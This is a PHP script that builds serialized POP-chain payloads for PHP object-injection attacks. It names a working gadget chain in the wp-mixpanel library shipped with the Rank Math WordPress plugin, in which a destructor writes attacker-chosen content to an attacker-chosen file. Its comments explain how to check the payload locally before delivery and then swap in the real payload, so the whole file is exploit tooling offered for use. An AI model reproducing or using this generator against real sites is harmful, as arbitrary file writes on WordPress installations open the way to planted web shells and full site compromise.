<?php
/**
 * POP-chain payload generator — Reflection-based (adapt per target).
 *
 * WHY: hand-assembling PHP serialized strings breaks on byte lengths
 * (silent, fatal). Build with the real classes + Reflection + serialize().
 *
 * Usage:
 *   1) require the target's real class files (dependency order, parents first)
 *   2) adapt build() to set the gadget properties you need
 *   3) php gen_payload_reflection.php            -> /tmp/payload.txt
 *   4) VALIDATE LOCALLY before delivery, e.g.:
 *      php -r 'require ...; $o=unserialize(file_get_contents("/tmp/payload.txt"));
 *              unset($o); clearstatcache();
 *              echo file_exists("/tmp/pop_probe.txt") ? file_get_contents("/tmp/pop_probe.txt") : "NO FILE";'
 *
 * Reference gadget: wp-mixpanel (ships in rank-math & others):
 *   WPMedia_Producers_MixpanelEvents __destruct -> flush -> FileConsumer::persist
 *   -> file_put_contents($file, json_encode($batch)."\n", FILE_APPEND|LOCK_EX)
 */

// ---- 1) real classes, parents first ----
require 'Base/MixpanelBase.php';
require 'ConsumerStrategies/AbstractConsumer.php';
require 'ConsumerStrategies/FileConsumer.php';
require 'Producers/MixpanelBaseProducer.php';
require 'Producers/MixpanelEvents.php';

function build($target_path, $content) {
    // root object = the class that gets __destruct
    $rc  = new ReflectionClass('WPMedia_Producers_MixpanelEvents');
    $obj = $rc->newInstanceWithoutConstructor();   // no ctor side effects (= unserialize semantics)

    // _consumer: PRIVATE property on the PARENT class -> resolve via parent ReflectionClass
    $rp = (new ReflectionClass('WPMedia_Producers_MixpanelBaseProducer'))->getProperty('_consumer');
    $rp->setAccessible(true);
    $rp->setValue($obj, new WPMedia_ConsumerStrategies_FileConsumer(['file' => $target_path]));

    // _queue: what gets persisted (the payload that lands in the file)
    $rq = (new ReflectionClass('WPMedia_Producers_MixpanelBaseProducer'))->getProperty('_queue');
    $rq->setAccessible(true);
    $rq->setValue($obj, [$content]);

    // _options: protected GATE — without max_batch_size, batch size computes 0 -> nothing written
    $ro = (new ReflectionClass('WPMedia_Base_MixpanelBase'))->getProperty('_options');
    $ro->setAccessible(true);
    $ro->setValue($obj, ['max_batch_size' => 50, 'debug' => false]);

    return serialize($obj);
}

// ---- 2) build ----
$p = build('/tmp/pop_probe.txt', 'POPCHAIN_MARKER');   // marker first; switch to the real payload after validation
file_put_contents('/tmp/payload.txt', $p);
echo "payload bytes: ", strlen($p), "\n";
echo substr($p, 0, 160), "...\n";
